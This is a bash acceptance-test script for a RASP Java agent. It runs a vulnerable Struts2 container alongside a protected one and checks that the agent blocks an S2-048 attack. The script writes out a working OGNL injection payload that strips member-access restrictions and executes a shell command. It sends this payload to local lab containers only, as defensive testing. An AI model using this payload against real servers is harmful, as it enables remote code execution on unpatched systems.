#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

image="${OHMYRASP_VULHUB_STRUTS2_S2048_IMAGE:-vulhub/struts2:2.3.32-showcase}"
baseline_name="${OHMYRASP_VULHUB_STRUTS2_S2048_BASELINE_NAME:-ohmyrasp-vulhub-struts2-s2048-baseline}"
protected_name="${OHMYRASP_VULHUB_STRUTS2_S2048_PROTECTED_NAME:-ohmyrasp-vulhub-struts2-s2048-protected}"
baseline_port="${OHMYRASP_VULHUB_STRUTS2_S2048_BASELINE_PORT:-}"
protected_port="${OHMYRASP_VULHUB_STRUTS2_S2048_PROTECTED_PORT:-}"
host_agent_jar="$(pwd)/agent-java8/build/libs/ohmyrasp-agent-java8.jar"
baseline_dir="logs/vulhub-struts2-s2-048-java8-baseline"
protected_dir="logs/vulhub-struts2-s2-048-java8-protected"
protected_log="${protected_dir}/events.jsonl"

choose_free_port() {
  python3 - "$@" <<'PY'
import socket
import sys

reserved = {int(value) for value in sys.argv[1:] if value}
for _ in range(100):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.bind(("0.0.0.0", 0))
        port = sock.getsockname()[1]
    if port not in reserved:
        print(port)
        raise SystemExit(0)
raise SystemExit("could not allocate a free host port")
PY
}

if [[ -z "$baseline_port" ]]; then
  baseline_port="$(choose_free_port)"
fi
if [[ -z "$protected_port" ]]; then
  protected_port="$(choose_free_port "$baseline_port")"
fi

docker run --rm -v "$(pwd):/workspace" -w /workspace gradle:jdk25 \
  gradle --no-daemon :agent-java8:agentJava8Jar

rm -rf "$baseline_dir" "$protected_dir"
mkdir -p "$baseline_dir" "$protected_dir"
: > "$protected_log"
chmod 666 "$protected_log"

cleanup() {
  docker logs "$baseline_name" > "${baseline_dir}/container.log" 2>&1 || true
  docker logs "$protected_name" > "${protected_dir}/container.log" 2>&1 || true
  docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true
}
trap cleanup EXIT

docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true

docker run -d --name "$baseline_name" -p "${baseline_port}:8080" \
  "$image" >/dev/null

docker run -d --name "$protected_name" -p "${protected_port}:8080" \
  -v "${host_agent_jar}:/opt/ohmyrasp/ohmyrasp-agent-java8.jar:ro" \
  -v "$(pwd)/${protected_dir}:/opt/ohmyrasp/logs" \
  -e JAVA_TOOL_OPTIONS="-javaagent:/opt/ohmyrasp/ohmyrasp-agent-java8.jar -Dohmyrasp.java8.log=/opt/ohmyrasp/logs/events.jsonl -Dohmyrasp.java8.block=true" \
  "$image" >/dev/null

wait_for() {
  local name="$1"
  local port="$2"
  local status
  for _ in $(seq 1 180); do
    status="$(curl -sS -o "/tmp/${name}.html" -w "%{http_code}" \
      "http://127.0.0.1:${port}/integration/editGangster.action" || true)"
    if [[ "$status" == "200" ]]; then
      return
    fi
    sleep 1
  done
  echo "${name} did not expose Struts2 S2-048 integration form at ${port}" >&2
  exit 1
}

post_payload() {
  local port="$1"
  local output="$2"
  python3 - "$port" "$output" <<'PY'
import http.client
import sys
import urllib.parse

port = int(sys.argv[1])
output = sys.argv[2]
payload = (
    "%{"
    "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    "(#_memberAccess?(#_memberAccess=#dm):"
    "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    "(#ognlUtil.getExcludedPackageNames().clear())."
    "(#ognlUtil.getExcludedClasses().clear())."
    "(#context.setMemberAccess(#dm))))."
    "(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream()))."
    "(#q)"
    "}"
)
body = urllib.parse.urlencode(
    {"name": payload, "age": "33", "description": "ohmyrasp"}
).encode()
headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "Content-Length": str(len(body)),
    "User-Agent": "ohmyrasp-s2-048",
}
connection = http.client.HTTPConnection("127.0.0.1", port, timeout=30)
try:
    connection.request("POST", "/integration/saveGangster.action", body=body, headers=headers)
    response = connection.getresponse()
    content = response.read()
finally:
    connection.close()

with open(output, "wb") as handle:
    handle.write(f"HTTP/1.1 {response.status} {response.reason}\n".encode())
    for key, value in response.getheaders():
        handle.write(f"{key}: {value}\n".encode(errors="replace"))
    handle.write(b"\n")
    handle.write(content)
print(response.status)
PY
}

wait_for "$baseline_name" "$baseline_port"
wait_for "$protected_name" "$protected_port"

if ! grep -q '"event":"ohmyrasp-java8-agent-start"' "$protected_log"; then
  cat "$protected_log" >&2 || true
  echo "missing Java 8 startup event in Struts2 S2-048 protected container" >&2
  exit 1
fi
if grep -q '"event":"ohmyrasp-detection"' "$protected_log"; then
  cat "$protected_log" >&2
  echo "Struts2 S2-048 protected startup/readiness produced a detection before the exploit request" >&2
  exit 1
fi

baseline_status="$(post_payload "$baseline_port" "${baseline_dir}/attack.response")"
if [[ "$baseline_status" != "200" ]] || ! grep -q 'uid=0(root)' "${baseline_dir}/attack.response"; then
  sed -n '1,200p' "${baseline_dir}/attack.response" >&2 || true
  echo "baseline Struts2 S2-048 Gangster Name OGNL did not return id output; status=${baseline_status}" >&2
  exit 1
fi

protected_status="$(post_payload "$protected_port" "${protected_dir}/attack.response")"
if grep -q 'uid=0(root)' "${protected_dir}/attack.response"; then
  sed -n '1,200p' "${protected_dir}/attack.response" >&2 || true
  echo "protected Struts2 S2-048 Gangster Name OGNL returned command output despite Java8 RASP; status=${protected_status}" >&2
  exit 1
fi
for _ in $(seq 1 30); do
  if grep -q '"algorithm":"java8_command_execution_exploit_primitive".*"action":"block"' "$protected_log"; then
    echo "vulhub Struts2 S2-048 Java8 acceptance passed"
    exit 0
  fi
  sleep 1
done

cat "$protected_log" >&2
echo "missing java8_command_execution_exploit_primitive block event for Struts2 S2-048" >&2
exit 1
